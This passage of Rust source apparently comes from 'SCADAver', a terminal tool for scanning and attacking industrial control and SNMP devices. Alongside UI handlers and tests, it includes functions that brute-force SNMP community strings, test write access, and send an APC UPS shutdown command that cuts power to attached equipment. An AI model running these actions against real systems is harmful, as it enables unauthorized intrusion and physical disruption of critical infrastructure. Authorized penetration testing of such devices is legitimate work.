        Line::from(Span::styled(
            "  Red      Action requires YES confirmation",
            s.fg(Color::Red),
        )),
        Line::from(Span::styled(
            "  Gray     Action unavailable for detected capabilities",
            s.fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Output",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            "  O        Zoom output panel fullscreen",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  C        Clear output panel",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  PgUp/Dn  Scroll output (any mode)",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  g / G    Top / bottom (in zoom)",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  Cyan ══  Job start/end separator",
            s.fg(Color::Cyan),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Global",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            "  ?        Toggle this help",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  ESC      Back / cancel / clear filter",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  Q        Quit (confirm prompt)",
            s.fg(Color::White),
        )),
        Line::from(Span::styled("  C-c      Force quit", s.fg(Color::White))),
        Line::from(""),
        Line::from(Span::styled(
            "  DB: ~/.config/scadaver/devices.db",
            s.fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(" Help \u{2014} SCADAver ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Cyan)),
            )
            .wrap(Wrap { trim: false }),
        popup,
    );
}

fn draw_quit_confirm(frame: &mut Frame, area: Rect) {
    let popup = centered_rect(38, 22, area);
    frame.render_widget(Clear, popup);
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            "  Quit SCADAver?",
            Style::default()
                .fg(Color::White)
                .add_modifier(Modifier::BOLD),
        )),
        Line::from(""),
        Line::from(Span::styled(
            "  [Q] Confirm quit",
            Style::default().fg(Color::Red),
        )),
        Line::from(Span::styled(
            "  [ESC] Cancel",
            Style::default().fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text).block(
            Block::default()
                .title(" Confirm Exit ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Red)),
        ),
        popup,
    );
}

fn centered_rect(pct_x: u16, pct_y: u16, area: Rect) -> Rect {
    let margin_v = (100 - pct_y) / 2;
    let margin_h = (100 - pct_x) / 2;
    let vert = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Percentage(margin_v),
            Constraint::Percentage(pct_y),
            Constraint::Percentage(margin_v),
        ])
        .split(area);
    Layout::default()
        .direction(Direction::Horizontal)
        .constraints([
            Constraint::Percentage(margin_h),
            Constraint::Percentage(pct_x),
            Constraint::Percentage(margin_h),
        ])
        .split(vert[1])[1]
}

// ─── Event handlers ──────────────────────────────────────────────────────────

/// Returns true if the app should quit.
fn handle_key(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -> bool {
    let mode = app.mode.clone();
    match mode {
        Mode::Normal => handle_normal(app, db, code, mods),
        Mode::IpInput => {
            handle_ip_input(app, code);
            false
        }
        Mode::ScanMenu => {
            handle_scan_menu(app, code);
            false
        }
        Mode::ExploitMenu => {
            handle_exploit_menu(app, code);
            false
        }
        Mode::ExploitInput => {
            handle_exploit_input(app, code);
            false
        }
        Mode::ExploitConfirm => {
            handle_exploit_confirm(app, code);
            false
        }
        Mode::VendorPicker => {
            handle_vendor_picker(app, code);
            false
        }
        Mode::Search => {
            handle_search(app, code);
            false
        }
        Mode::Help => {
            app.mode = Mode::Normal;
            false
        }
        Mode::OutputZoom => {
            handle_output_zoom(app, code, mods);
            false
        }
    }
}

fn handle_output_zoom(app: &mut App, code: KeyCode, mods: KeyModifiers) {
    match code {
        KeyCode::Esc | KeyCode::Char('o' | 'O') => app.exit_zoom(),
        KeyCode::Char('c') if mods.contains(KeyModifiers::CONTROL) => app.exit_zoom(),
        KeyCode::Char('c' | 'C') => {
            app.output_lines.clear();
            app.output_scroll = 0;
        }
        KeyCode::Char('j') | KeyCode::Down => app.scroll_output_down(1),
        KeyCode::Char('k') | KeyCode::Up => app.scroll_output_up(1),
        KeyCode::PageDown => app.scroll_output_down(20),
        KeyCode::PageUp => app.scroll_output_up(20),
        // g = go to top (oldest), G = go to bottom (newest / auto-scroll)
        KeyCode::Char('G') | KeyCode::End => app.output_scroll = 0,
        KeyCode::Char('g') | KeyCode::Home => {
            app.output_scroll = app.output_lines.len().saturating_sub(1);
        }
        _ => {}
    }
}

fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -> bool {
    match code {
        KeyCode::Char('q' | 'Q') => {
            if app.quit_confirm {
                return true;
            }
            app.quit_confirm = true;
            return false;
        }
        KeyCode::Char('c') if mods.contains(KeyModifiers::CONTROL) => return true,
        KeyCode::Esc if app.quit_confirm => {
            app.quit_confirm = false;
        }
        KeyCode::PageUp => {
            app.scroll_output_up(10);
        }
        KeyCode::PageDown => {
            app.scroll_output_down(10);
        }
        KeyCode::Char('o' | 'O') => app.enter_zoom(),
        KeyCode::Char('j') | KeyCode::Down => app.select_next(),
        KeyCode::Char('k') | KeyCode::Up => app.select_prev(),
        KeyCode::Char('a' | 'A') => {
            app.input_buf.clear();
            app.output_lines.clear();
            app.output_scroll = 0;
            app.mode = Mode::IpInput;
        }
        KeyCode::Char('s' | 'S') => {
            app.scan_menu_sel = 0;
            app.mode = Mode::ScanMenu;
        }
        KeyCode::Char('e' | 'E') => {
            app.open_exploit_menu();
            maybe_auto_load_tags(app);
        }
        KeyCode::Char('r' | 'R') => {
            if let Some(ip) = app.selected_device_ip() {
                if app.active_jobs == 0 {
                    app.output_lines.clear();
                    app.output_scroll = 0;
                }
                app.output_lines.push(format!("══ Rescan @ {ip} ══"));
                app.active_jobs += 1;
                app.log(format!("[*] Rescanning {ip}..."));
                let tx = app.scan_tx.clone();
                let port = app.device_port(0);
                let mut target = TargetScan::new(ip);
                if port != 0 {
                    target.port = Some(port);
                }
                target.transport = selected_transport(app);
                target.vendor = app.selected_device().map(|d| d.vendor.to_ascii_lowercase());
                spawn_ip_scan(target, tx);
            }
        }
        KeyCode::Char('c' | 'C') if !mods.contains(KeyModifiers::CONTROL) => {
            app.output_lines.clear();
            app.output_scroll = 0;
        }
        KeyCode::Char('d' | 'D') => {
            if let Some(dev) = app.selected_device() {
                let (id, ip) = (dev.id, dev.ip.clone());
                if db.delete_device(id).is_ok() {
                    app.log(format!("[!] Deleted {ip}"));
                    app.reload(db);
                }
            }
        }
        KeyCode::Char('/') => {
            app.input_buf.clear();
            app.mode = Mode::Search;
        }
        KeyCode::Char('?') => app.mode = Mode::Help,
        KeyCode::Esc => {
            if app.quit_confirm {
                app.quit_confirm = false;
            } else {
                app.filter.clear();
                app.rebuild_filtered();
            }
        }
        _ => {}
    }
    false
}

fn handle_ip_input(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            app.mode = Mode::Normal;
            app.input_buf.clear();
        }
        KeyCode::Enter => {
            let raw = app.input_buf.trim().to_string();
            if let Some(target) = parse_target_scan(&raw) {
                if app.active_jobs == 0 {
                    app.output_lines.clear();
                    app.output_scroll = 0;
                }
                let label = target.label();
                app.output_lines.push(format!("== Probe @ {label} =="));
                app.active_jobs += 1;
                app.log(format!("[*] Probing {label}..."));
                let tx = app.scan_tx.clone();
                spawn_ip_scan(target, tx);
                app.mode = Mode::Normal;
                app.input_buf.clear();
            } else if !raw.is_empty() {
                app.log(format!("[!] Invalid target: {raw}"));
            }
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
        }
        KeyCode::Char(c) if app.input_buf.len() < 40 => app.input_buf.push(c),
        _ => {}
    }
}

fn handle_scan_menu(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => app.mode = Mode::Normal,
        KeyCode::Char('j') | KeyCode::Down => {
            app.scan_menu_sel = (app.scan_menu_sel + 1).min(SCAN_ITEMS.len() - 1);
        }
        KeyCode::Char('k') | KeyCode::Up => {
            app.scan_menu_sel = app.scan_menu_sel.saturating_sub(1);
        }
        KeyCode::Enter => {
            let sel = app.scan_menu_sel;
            if sel == SCAN_BACK_IDX {
                app.mode = Mode::Normal;
            } else {
                if app.active_jobs == 0 {
                    app.output_lines.clear();
                    app.output_scroll = 0;
                }
                let label_str = SCAN_ITEMS[sel];
                app.output_lines.push(format!("══ Scan: {label_str} ══"));
                app.active_jobs += 1;
                app.log(format!("[*] Starting broadcast scan: {label_str}..."));
                let tx = app.scan_tx.clone();
                spawn_broadcast_scan(sel, tx);
                app.mode = Mode::Normal;
            }
        }
        _ => {}
    }
}

fn handle_exploit_menu(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => app.mode = Mode::Normal,
        KeyCode::PageUp => {
            app.scroll_output_up(10);
        }
        KeyCode::PageDown => {
            app.scroll_output_down(10);
        }
        KeyCode::Char('o' | 'O') => app.enter_zoom(),
        KeyCode::Char('v' | 'V') => {
            let active = app.selected_vendor().unwrap_or_default();
            app.vendor_pick_sel = ALL_VENDORS
                .iter()
                .position(|&v| v == active.as_str())
                .unwrap_or(0);
            app.mode = Mode::VendorPicker;
        }
        KeyCode::Char('j') | KeyCode::Down => {
            app.exploit_sel = (app.exploit_sel + 1).min(app.exploit_defs.len().saturating_sub(1));
        }
        KeyCode::Char('k') | KeyCode::Up => {
            app.exploit_sel = app.exploit_sel.saturating_sub(1);
        }
        KeyCode::Enter => {
            let is_back = app
                .exploit_defs
                .get(app.exploit_sel)
                .is_some_and(|e| e.label.starts_with('\u{2190}'));
            if is_back {
                app.mode = Mode::Normal;
            } else {
                let Some(exploit) = app.exploit_defs.get(app.exploit_sel) else {
                    return;
                };
                let availability = action_availability(app, exploit);
                if !availability.enabled {
                    let reason = availability.reason.unwrap_or("action unavailable");
                    app.output_lines
                        .push(format!("[!] {} unavailable: {reason}", exploit.label));
                    app.output_lines.push(
                        "[*] Rescan with the right protocol/port or use [V] to view as another protocol."
                            .to_string(),
                    );
                    app.output_scroll = 0;
                    return;
                }
                if exploit.needs_input {
                    app.input_buf.clear();
                    app.mode = Mode::ExploitInput;
                } else {
                    fire_exploit(app, "");
                }
            }
        }
        _ => {}
    }
}

fn handle_exploit_input(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            app.mode = Mode::ExploitMenu;
            app.input_buf.clear();
        }
        KeyCode::Enter => {
            let input = app.input_buf.clone();
            fire_exploit(app, &input);
            if app.mode != Mode::ExploitConfirm {
                app.mode = Mode::ExploitMenu;
            }
            app.input_buf.clear();
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
        }
        KeyCode::Char(c) if app.input_buf.len() < 128 => app.input_buf.push(c),
        _ => {}
    }
}

fn handle_exploit_confirm(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            if let Some(pending) = app.pending_exploit.take() {
                app.log(format!("[*] Cancelled: {}", pending.label));
            }
            app.input_buf.clear();
            app.mode = Mode::ExploitMenu;
        }
        KeyCode::Enter => {
            if app.input_buf.trim() == "YES" {
                if let Some(pending) = app.pending_exploit.take() {
                    execute_pending_exploit(app, &pending);
                }
                app.mode = Mode::ExploitMenu;
            } else {
                app.log("[!] Confirmation requires exactly YES");
            }
            app.input_buf.clear();
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
        }
        KeyCode::Char(c) if app.input_buf.len() < 8 => app.input_buf.push(c),
        _ => {}
    }
}

fn handle_search(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            app.input_buf.clear();
            app.filter.clear();
            app.rebuild_filtered();
            app.mode = Mode::Normal;
        }
        KeyCode::Enter => {
            app.filter = app.input_buf.clone();
            app.rebuild_filtered();
            app.mode = Mode::Normal;
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
            app.filter = app.input_buf.clone();
            app.rebuild_filtered();
        }
        KeyCode::Char(c) => {
            app.input_buf.push(c);
            app.filter = app.input_buf.clone();
            app.rebuild_filtered();
        }
        _ => {}
    }
}

fn handle_vendor_picker(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => app.mode = Mode::ExploitMenu,
        KeyCode::Char('j') | KeyCode::Down => {
            app.vendor_pick_sel = (app.vendor_pick_sel + 1).min(ALL_VENDORS.len() - 1);
        }
        KeyCode::Char('k') | KeyCode::Up => {
            app.vendor_pick_sel = app.vendor_pick_sel.saturating_sub(1);
        }
        KeyCode::Enter => {
            let vendor = ALL_VENDORS[app.vendor_pick_sel].to_string();
            app.vendor_override = Some(vendor.clone());
            app.exploit_defs = exploits_for(&vendor);
            app.exploit_sel = 0;
            app.mode = Mode::ExploitMenu;
        }
        _ => {}
    }
}

fn draw_vendor_picker(frame: &mut Frame, area: Rect, app: &App) {
    let popup = centered_rect(40, 75, area);
    frame.render_widget(Clear, popup);
    let items: Vec<ListItem> = ALL_VENDORS
        .iter()
        .map(|&v| {
            ListItem::new(Line::from(Span::styled(
                format!("  {}  ", v.to_uppercase()),
                Style::default().fg(vendor_color(v)),
            )))
        })
        .collect();
    let mut state = ListState::default();
    state.select(Some(app.vendor_pick_sel));
    let list = List::new(items)
        .block(
            Block::default()
                .title(" View as Protocol \u{2014} [J/K] Navigate  [ENTER] Apply  [ESC] Cancel ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Magenta)),
        )
        .highlight_style(
            Style::default()
                .bg(Color::DarkGray)
                .add_modifier(Modifier::BOLD),
        )
        .highlight_symbol("\u{25b6} ");
    frame.render_stateful_widget(list, popup, &mut state);
}

/// Load saved tags from DB into the output panel (synchronous).
/// Returns true if any tags were found.
fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> bool {
    use crate::db::Database;
    use crate::vendors::rockwell::driver;

    let Ok(db) = Database::open(&Database::default_path()) else { return false };
    let Ok(tags) = db.load_tags(ip) else { return false };
    if tags.is_empty() { return false; }

    lines.push(format!(
        "══ {} saved tags @ {ip} (DB snapshot) ══",
        tags.len()
    ));
    let [hdr, sep] = tag_header();
    lines.push(hdr);
    lines.push(sep.clone());
    for t in &tags {
        let (base, dims) = driver::type_parts(u16::try_from(t.tag_type).unwrap_or(u16::MAX));
        lines.push(fmt_tag_row(
            t.instance_id,
            &t.name,
            &base,
            dims,
            "-",
            t.tag_type,
        ));
    }
    lines.push(sep);
    lines.push(format!("[+] {} tag(s) loaded from database", tags.len()));
    true
}

/// Called when the exploit menu opens for Rockwell/enip with an empty output panel.
/// Shows saved DB tags immediately, then starts a background live-check for changes.
fn maybe_auto_load_tags(app: &mut App) {
    let Some(vendor) = app.selected_vendor() else { return };
    if !matches!(vendor.to_lowercase().as_str(), "rockwell" | "enip") {
        return;
    }
    if !app.output_lines.is_empty() {
        return;
    }
    let Some(ip) = app.selected_device_ip() else { return };

    let has_tags = load_db_tags_to_output(&ip, &mut app.output_lines);

    if has_tags {
        app.output_lines
            .push(format!("── checking live tags @ {ip}... ──"));
        app.active_jobs += 1;
        let tx = app.scan_tx.clone();
        std::thread::spawn(move || {
            background_tag_check(&ip, &tx);
        });
    }
}

/// Background worker: enumerates live tags, diffs vs DB, reports changes.
fn background_tag_check(ip: &str, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::rockwell::driver;
    let out = |msg: &str| {
        let _ = tx.send(ScanEvent::Output(msg.to_string()));
    };
    match driver::enumerate_tags(ip, 0) {
        Ok(tags) => save_tags_and_diff(ip, &tags, &out),
        Err(e) => out(&format!("[-] Live tag check failed: {e}")),
    }
    let _ = tx.send(ScanEvent::Done(format!("tag refresh @ {ip}")));
}

fn fire_exploit(app: &mut App, input: &str) {
    if let (Some(ip), Some(vendor)) = (app.selected_device_ip(), app.selected_vendor()) {
        let Some(exploit_def) = app.exploit_defs.get(app.exploit_sel) else {
            return;
        };
        let label = exploit_def.label;
        let availability = action_availability(app, exploit_def);
        if !availability.enabled {
            let reason = availability.reason.unwrap_or("action unavailable");
            app.output_lines
                .push(format!("[!] {label} unavailable: {reason}"));
            app.output_scroll = 0;
            return;
        }
        let pending = PendingExploit {
            vendor: vendor.clone(),
            idx: app.exploit_sel,
            ip: ip.clone(),
            port: app.action_port(&vendor, app.exploit_sel),
            input: input.to_string(),
            label: label.to_string(),
        };
        if requires_confirmation(exploit_def) {
            app.pending_exploit = Some(pending);
            app.mode = Mode::ExploitConfirm;
            app.input_buf.clear();
        } else {
            execute_pending_exploit(app, &pending);
        }
    }
}

// ─── Entry point ─────────────────────────────────────────────────────────────

fn execute_pending_exploit(app: &mut App, pending: &PendingExploit) {
    let is_monitor = app
        .exploit_defs
        .get(pending.idx)
        .is_some_and(|e| e.is_monitor);

    if app.active_jobs == 0 {
        app.output_lines.clear();
        app.output_scroll = 0;
    }
    app.output_lines
        .push(format!("== {} @ {} ==", pending.label, pending.ip));
    app.log(format!("[*] Running: {} on {}", pending.label, pending.ip));
    app.active_jobs += 1;

    if is_monitor {
        if let Some(stop) = app.monitor_stop.take() {
            stop.store(true, Ordering::SeqCst);
        }
        let stop = Arc::new(AtomicBool::new(false));
        app.monitor_stop = Some(Arc::clone(&stop));
        let tx = app.scan_tx.clone();
        let ip2 = pending.ip.clone();
        let label2 = pending.label.clone();
        let port = pending.port;
        std::thread::spawn(move || {
            let tx2 = tx.clone();
            let out = move |msg: &str| {
                let _ = tx2.send(ScanEvent::Output(msg.to_string()));
            };
            exploit_rockwell_monitor(&ip2, port, &out, &stop);
            let _ = tx.send(ScanEvent::Done(format!("{label2} @ {ip2}")));
        });
    } else {
        run_exploit_for(
            &pending.vendor,
            pending.idx,
            &pending.ip,
            pending.port,
            &pending.input,
            &pending.label,
            app.scan_tx.clone(),
        );
    }
}

pub fn run(db: &Database) -> Result<()> {
    let mut app = App::new(db);
    app.log("[*] SCADAver started. Press [?] for help, [S] to scan, [A] to add an IP.");

    let mut terminal = ratatui::init();
    let result = run_loop(&mut terminal, &mut app, db);
    ratatui::restore();
    result
}

fn run_loop<B: Backend>(terminal: &mut Terminal<B>, app: &mut App, db: &Database) -> Result<()> {
    loop {
        app.drain_scan_events(db);
        terminal.draw(|f| draw(f, app))?;

        if event::poll(Duration::from_millis(50))? {
            if let Event::Key(key) = event::read()? {
                if key.kind == KeyEventKind::Press && handle_key(app, db, key.code, key.modifiers) {
                    break;
                }
            }
        }
    }
    Ok(())
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

fn hex_fmt(b: &[u8]) -> String {
    use std::fmt::Write;
    b.iter().fold(String::new(), |mut s, x| {
        let _ = write!(s, "{x:02x}");
        s
    })
}

// ─── SNMP exploits ────────────────────────────────────────────────────────────

fn exploit_snmp_sys_info(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::snmp::{client, oids};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] SNMP system info from {ip}:{p}..."));
    let Some(community) = client::discover_community(ip, p) else {
        out("[-] No SNMP response on any common community");
        return;
    };
    let scalar = [oids::SYS_DESCR, oids::SYS_OBJECT_ID, oids::SYS_UPTIME,
                  oids::SYS_CONTACT, oids::SYS_NAME, oids::SYS_LOCATION];
    let labels = ["sysDescr", "sysOID", "Uptime", "Contact", "Name", "Location"];
    match client::get_multi(ip, p, &community, &scalar) {
        Ok(results) => {
            out(&format!("  community = {community}"));
            for (i, (_, val)) in results.iter().enumerate() {
                out(&format!("  {:<10} = {}", labels[i], val.display()));
            }
            out("[+] System info retrieved");
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_snmp_interfaces(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::snmp::{client, enumerate};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] SNMP interface table from {ip}:{p}..."));
    let Some(community) = client::discover_community(ip, p) else {
        out("[-] No SNMP response");
        return;
    };
    match enumerate::get_interfaces(ip, p, &community) {
        Ok(ifaces) if ifaces.is_empty() => out("[!] No interface entries returned"),
        Ok(ifaces) => {
            for i in &ifaces {
                let state = if i.oper_up { "up" } else { "DOWN" };
                out(&format!("  [{:>2}] {:<16} {} {:<5}  {}Mbps  err in:{} out:{}",
                    i.index, i.descr, i.mac, state, i.speed_mbps, i.in_errors, i.out_errors));
            }
            out(&format!("[+] {} interface(s)", ifaces.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_snmp_topology(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::snmp::{client, enumerate};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] SNMP network topology from {ip}:{p}..."));
    let Some(community) = client::discover_community(ip, p) else {
        out("[-] No SNMP response");
        return;
    };
    match enumerate::get_topology(ip, p, &community) {
        Ok(lines) if lines.is_empty() => out("[!] No IP/route/ARP data returned"),
        Ok(lines) => {
            for l in &lines { out(l); }
            out("[+] Topology data retrieved");
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_snmp_community_scan(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::snmp::{client, oids};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] SNMP community scan on {ip}:{p}..."));
    let mut found = 0u32;
    for &c in oids::COMMON_COMMUNITIES {
        if let Ok(val) = client::get(ip, p, c, oids::SYS_DESCR) {
            out(&format!("  [+] community={c:<12}  sysDescr={}", val.display()));
            found += 1;
        }
    }
    if found == 0 {
        out("[-] No community strings responded");
    } else {
        out(&format!("[+] {found} community string(s) found"));
    }
}

fn exploit_snmp_cve_probe(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::snmp::{client, enumerate};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] SNMP CVE probe on {ip}:{p}..."));
    let Some(community) = client::discover_community(ip, p) else {
        out("[-] No SNMP response");
        return;
    };
    match enumerate::get_system_info(ip, p, &community) {
        Ok(info) => {
            out(&format!("  sysDescr = {}", info.descr));
            out(&format!("  sysOID   = {}", info.object_id));
            let hits = enumerate::check_cves(&info);
            if hits.is_empty() {
                out("[*] No known CVE patterns matched");
            } else {
                for h in &hits {
                    out(&format!("  [{}] CVSS:{} {}", h.id, h.cvss, h.summary));
                    out(&format!("         ref: {}", h.ref_url));
                }
                out(&format!("[!] {} advisory match(es)", hits.len()));
            }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_snmp_walk(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::snmp::client;
    let p = if port == 0 { client::SNMP_PORT } else { port };
    let root = if input.trim().is_empty() { "1.3.6.1.2.1.1" } else { input.trim() };
    out(&format!("[*] SNMP walk {root} on {ip}:{p}..."));
    let Some(community) = client::discover_community(ip, p) else {
        out("[-] No SNMP response");
        return;
    };
    match client::walk(ip, p, &community, root) {
        Ok(entries) if entries.is_empty() => out("[!] No results (end of MIB or no access)"),
        Ok(entries) => {
            for (o, v) in &entries { out(&format!("  {o} = {}", v.display())); }
            out(&format!("[+] {} object(s)", entries.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_snmp_test_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::snmp::{client, oids};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    let community = if input.trim().is_empty() { "private" } else { input.trim() };
    out(&format!("[*] SNMP write test on {ip}:{p} with community='{community}'..."));
    // Read current sysName, then SET it back to the same value (no-op write)
    match client::get(ip, p, "public", oids::SYS_NAME) {
        Ok(current) => {
            let name_str = current.display();
            out(&format!("  current sysName = {name_str}"));
            let val = client::SnmpValue::OctetString(name_str.into_bytes());
            match client::set(ip, p, community, oids::SYS_NAME, &val) {
                Ok(_) => out("[+] Write confirmed — community string has write access"),
                Err(e) => out(&format!("[-] Write rejected: {e}")),
            }
        }
        Err(e) => out(&format!("[-] Could not read sysName: {e}")),
    }
}

fn exploit_snmp_apc_status(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::snmp::{client, oids};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] APC UPS status from {ip}:{p}..."));
    let Some(community) = client::discover_community(ip, p) else {
        out("[-] No SNMP response");
        return;
    };
    let apc_oids = [oids::APC_MODEL, oids::APC_FIRMWARE, oids::APC_SERIAL,
                    oids::APC_BATTERY_STATUS, oids::APC_RUNTIME_MINS,
                    oids::APC_INPUT_VOLTAGE, oids::APC_OUTPUT_LOAD_PCT, oids::APC_OUTPUT_STATUS];
    let labels = ["Model", "Firmware", "Serial", "Battery", "Runtime(min)", "InputV", "Load%", "OutStatus"];
    match client::get_multi(ip, p, &community, &apc_oids) {
        Ok(results) => {
            for (i, (_, val)) in results.iter().enumerate() {
                out(&format!("  {:<14} = {}", labels[i], val.display()));
            }
            let bat = results.get(3).and_then(|(_, v)| v.as_int()).unwrap_or(0);
            if bat != 2 { out("[!] Battery status is NOT normal (2=normal)"); }
            out("[+] APC status retrieved");
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_snmp_apc_shutdown(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::snmp::{client, oids};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    let community = if input.trim().is_empty() { "private" } else { input.trim() };
    out(&format!("[!] APC graceful shutdown on {ip}:{p} with community='{community}'"));
    out("[!] This will cut power to attached equipment after the UPS delay.");
    match client::set(ip, p, community, oids::APC_CMD_GRACEFUL_OFF, &client::SnmpValue::Integer(2)) {
        Ok(_) => out("[+] Graceful shutdown command accepted — equipment will lose power"),
        Err(e) => out(&format!("[-] Command rejected: {e}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_target_scan_accepts_ip_only() {
        let target = parse_target_scan("192.168.1.10").unwrap();
        assert_eq!(target.ip, "192.168.1.10");
        assert_eq!(target.port, None);
        assert_eq!(target.transport, None);
        assert_eq!(target.vendor, None);
    }

    #[test]
    fn parse_target_scan_accepts_port_and_transport() {
        let target = parse_target_scan("192.168.1.10:1502 tcp").unwrap();
        assert_eq!(target.ip, "192.168.1.10");
        assert_eq!(target.port, Some(1502));
        assert_eq!(target.transport, Some(TargetTransport::Tcp));
        assert_eq!(target.vendor, None);
    }

    #[test]
    fn parse_target_scan_accepts_port_only() {
        let target = parse_target_scan("192.168.1.10:1502").unwrap();
        assert_eq!(target.ip, "192.168.1.10");
        assert_eq!(target.port, Some(1502));
        assert_eq!(target.transport, None);
        assert_eq!(target.vendor, None);
    }

    #[test]
    fn parse_target_scan_accepts_transport_only() {
        let udp = parse_target_scan("192.168.1.10 udp").unwrap();
        assert_eq!(udp.ip, "192.168.1.10");
        assert_eq!(udp.port, None);
        assert_eq!(udp.transport, Some(TargetTransport::Udp));

        let both = parse_target_scan("192.168.1.10 both").unwrap();
        assert_eq!(both.ip, "192.168.1.10");
        assert_eq!(both.port, None);
        assert_eq!(both.transport, Some(TargetTransport::Both));
    }

    #[test]
    fn parse_target_scan_accepts_vendor_hints() {
        let mitsubishi = parse_target_scan("192.168.1.10:5007 mitsubishi").unwrap();
        assert_eq!(mitsubishi.ip, "192.168.1.10");
        assert_eq!(mitsubishi.port, Some(5007));
        assert_eq!(mitsubishi.transport, None);
        assert_eq!(mitsubishi.vendor.as_deref(), Some("mitsubishi"));

        let beckhoff = parse_target_scan("192.168.1.10:48898 beckhoff tcp").unwrap();
        assert_eq!(beckhoff.ip, "192.168.1.10");
        assert_eq!(beckhoff.port, Some(48898));
        assert_eq!(beckhoff.transport, Some(TargetTransport::Tcp));
        assert_eq!(beckhoff.vendor.as_deref(), Some("beckhoff"));
    }

    #[test]
    fn parse_target_scan_rejects_bad_transport() {
        assert!(parse_target_scan("192.168.1.10 serial").is_none());
        assert!(parse_target_scan("192.168.1.10 tcp udp").is_none());
        assert!(parse_target_scan("192.168.1.10 schneider mitsubishi").is_none());
    }

    #[test]
    fn parse_target_scan_rejects_invalid_ports() {
        assert!(parse_target_scan("192.168.1.10:0").is_none());
        assert!(parse_target_scan("192.168.1.10:65536").is_none());
        assert!(parse_target_scan("192.168.1.10:notaport").is_none());
    }

    #[test]
    fn parse_modbus_map_input_defaults_to_quick() {
        let ranges = parse_modbus_map_input("").unwrap();
        assert_eq!(
            ranges,
            vec![
                ModbusMapRange::new(ModbusTable::Holding, 0, 32),
                ModbusMapRange::new(ModbusTable::Input, 0, 32),
                ModbusMapRange::new(ModbusTable::Coil, 0, 64),
                ModbusMapRange::new(ModbusTable::Discrete, 0, 64),
            ]
        );
        assert_eq!(parse_modbus_map_input("quick").unwrap(), ranges);
    }

    #[test]
    fn parse_modbus_map_input_common_and_all() {
        let common = parse_modbus_map_input("common").unwrap();
        assert_eq!(
            common[0],
            ModbusMapRange::new(ModbusTable::Holding, 0, 1000)
        );
        assert_eq!(
            common[3],
            ModbusMapRange::new(ModbusTable::Discrete, 0, 2000)
        );

        let all = parse_modbus_map_input("all").unwrap();
        assert_eq!(
            all,
            vec![
                ModbusMapRange::new(ModbusTable::Holding, 0, MODBUS_ADDRESS_SPACE),
                ModbusMapRange::new(ModbusTable::Input, 0, MODBUS_ADDRESS_SPACE),
                ModbusMapRange::new(ModbusTable::Coil, 0, MODBUS_ADDRESS_SPACE),
                ModbusMapRange::new(ModbusTable::Discrete, 0, MODBUS_ADDRESS_SPACE),
            ]
        );
    }

    #[test]
    fn parse_modbus_map_input_custom_ranges() {
        let ranges =
            parse_modbus_map_input("hr:0:500,input-registers:10:20,co:5:6,di:7:8").unwrap();
        assert_eq!(ranges[0], ModbusMapRange::new(ModbusTable::Holding, 0, 500));
